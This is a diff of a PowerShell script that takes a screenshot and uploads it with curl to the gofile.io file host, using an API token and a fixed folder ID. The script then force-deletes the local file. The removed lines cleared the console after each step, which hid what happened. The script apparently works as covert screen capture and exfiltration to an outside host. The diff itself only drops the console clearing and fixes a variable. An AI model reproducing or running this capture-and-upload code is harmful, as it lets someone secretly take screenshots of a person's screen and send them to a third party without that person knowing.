@@ -17,7 +17,7 @@ $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
 Start-Sleep -Milliseconds 20
 $graphics.Dispose()
 $bitmap.Dispose()
-cls
+
 Write-Host "Screenshot saved to: $filePath" -ForegroundColor Green
 
 function Upload-FilesToGofile {
@@ -29,13 +29,13 @@ function Upload-FilesToGofile {
     try {
  
 
-            if (Test-Path $file) {
+            if (Test-Path $FilePath) {
                
                 $uploadUri = "https://store1.gofile.io/uploadFile"
                 
                 
-                curl.exe -sS -F "file=@$file" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
-                cls
+                curl.exe -sS -F "file=@$FilePath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
+                
                 Remove-Item $FilePath -Force
                 
                 Start-Sleep -Milliseconds 200
@@ -44,7 +44,7 @@ function Upload-FilesToGofile {
         }
    
     catch {
-        Clear-Host # This is your os.system("cls")
+        Write-Host $_.Exception.Message # This is your os.system("cls")
     }
 }
 Upload-FilesToGofile -FilePath $filePath -newFolderId "a96550e5-fd58-4965-a787-a5d20ec20bdc"
